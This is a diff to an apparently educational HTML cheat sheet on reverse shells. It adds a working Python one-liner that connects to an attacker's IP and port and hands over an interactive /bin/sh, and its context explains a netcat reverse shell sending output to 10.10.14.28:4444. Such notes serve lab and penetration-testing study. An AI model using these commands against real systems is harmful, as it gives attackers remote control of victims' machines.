@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>curl Commands</title>
+    <title>Reverse Shell</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="note.css">
    
@@ -39,6 +39,18 @@
             > '2>&1': Combines stdout & stderr to ensure both are sent through the connection. <br>
             > '| nc 10.10.14.28 4444': Sends the shell’s output to the attacker's machine using Netcat. <br>
             > '> /tmp/f': Writes incoming commands from the attacker back into the pipe for execution by the shell.
+            <br><br></li>
+    </ul>
+    <ul>
+        <li><code>$ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); <br>s.connect((\"IPaddr\",Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);
+            </code> <br><br>
+            > Create a socket: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) <br>This sets up a socket to use IPv4 (AF_INET) and TCP (SOCK_STREAM). <br>
+            > Connect to the attacker's machine: s.connect(("IPaddr",Port)) <br>
+            The script connects to the attacker's machine at IP xx.xx.xx.xx on port xxxx. <br>
+            > Redirect standard input, output, and error to the socket: os.dup2(s.fileno(),0), os.dup2(s.fileno(),1), os.dup2(s.fileno(),2) <br> standard input (0), output (1), and error (2) <br>
+            > Spawn an interactive shell: p=subprocess.call(["/bin/sh","-i"]) <br>
+            This spawns an interactive shell, giving the attacker control of the system.
+            
             <br><br></li>
     </ul>
     <ul>
